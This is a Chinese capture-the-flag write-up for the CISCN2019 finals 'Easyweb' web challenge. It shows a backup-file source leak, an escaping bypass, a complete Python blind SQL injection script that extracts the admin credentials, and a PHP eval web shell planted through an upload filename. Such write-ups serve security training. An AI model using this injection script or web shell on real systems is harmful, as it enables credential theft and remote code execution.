# \[CISCN2019 总决赛 Day2 Web1]Easyweb

## \[CISCN2019 总决赛 Day2 Web1]Easyweb

## 考点

* `.php.bak`源码泄露
* 盲注
* 利用转义进行bypass
* 文件上传
* `<?=`绕过`<?php`的限制

## wp

扫描发现robots.txt，其内容如下，意味着可以获取源码，目前已知的文件有 index.php，user.php，image.php

```
User-agent: *
Disallow: *.php.bak
```

发现image.php.bak存在，下载进行审计，可以看到如下代码

```
$id = $_GET['id'];
$id=addslashes($id);
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
```

如果输入参数`id=\\0` 那么最终处理后的内容为 `\\\`，SQL语句拼接如下

```
select * from images where or path='{$path}'
```

这就会转义单引号，使第一个单引号闭合第三个单引号

然后进行注入，发现过滤空格和单双引号，在请求 `id=\\0&path= or 1%23` 时返回正常图片，请求 `id=\\0&path= or 0%23` 时返回图片错误。这里就是盲注了

可以获得当前数据库为 ciscnfinal，表为 images,users，users表中的字段为username,password，内容为 admin d2bf6e35814ce4f64d44，这就拿到了用户名和密码，盲注脚本如下

```python
import requests

# python会对请求的url进行自动编码
# id=1\\0&path=or 0# 返回图片错误
# id=1\\0&path=or 1# 返回正常
# ?id=\\\\0&path=
url = "http://8fc867ee-ba5b-45b2-9b89-fa83966fd57b.node3.buuoj.cn/image.php"

# ciscnfinal
def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f" or (ascii(substr((select database()),{i},1))>{mid})#"
            data = {
                'id': '\\\\0',
                'path': payload
            }
            r = requests.get(url=url, params=data)
            if len(r.text)==0:
                high = mid
            if len(r.text)>0:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
# get_database()

# images,users
def get_table():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f" or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid})#"
            # print(payload)
            data = {
                'id': '\\\\0',
                'path': payload
            }
            r = requests.get(url=url, params=data)
            
            if len(r.text)==0:
                high = mid
            if len(r.text)>0:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
# get_table()

# username,password
def get_column():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{i},1))>{mid})#"
            # print(payload)
            data = {
                'id': '\\\\0',
                'path': payload
            }
            r = requests.get(url=url, params=data)
            
            if len(r.text)==0:
                high = mid
            if len(r.text)>0:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
# get_column()

# admin d2bf6e35814ce4f64d44
def get_admin():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            # payload = f" or (ascii(substr((select group_concat(username) from users),{i},1))>{mid})#"
            payload = f" or (ascii(substr((select group_concat(password) from users),{i},1))>{mid})#"
            # print(payload)
            data = {
                'id': '\\\\0',
                'path': payload
            }
            r = requests.get(url=url, params=data)
            
            if len(r.text)==0:
                high = mid
            if len(r.text)>0:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_admin()
```

直接登陆后，发现是文件上传，随意上传一个txt文件，发现返回了一个日志地址

```
logs/upload.fc2d5409b8eecc37e459fea44f30ce8e.log.php
```

访问之后显示

```
User admin uploaded file 123.txt.
```

这里包含了上传文件的文件名，就可以在上传文件的文件名那里去写shell，发现其过滤了`<?php` 但是可以使用 `<?=` 来绕过

上传文件名改为 `<?=eval($_POST['cmd']);?>` 即可getshell
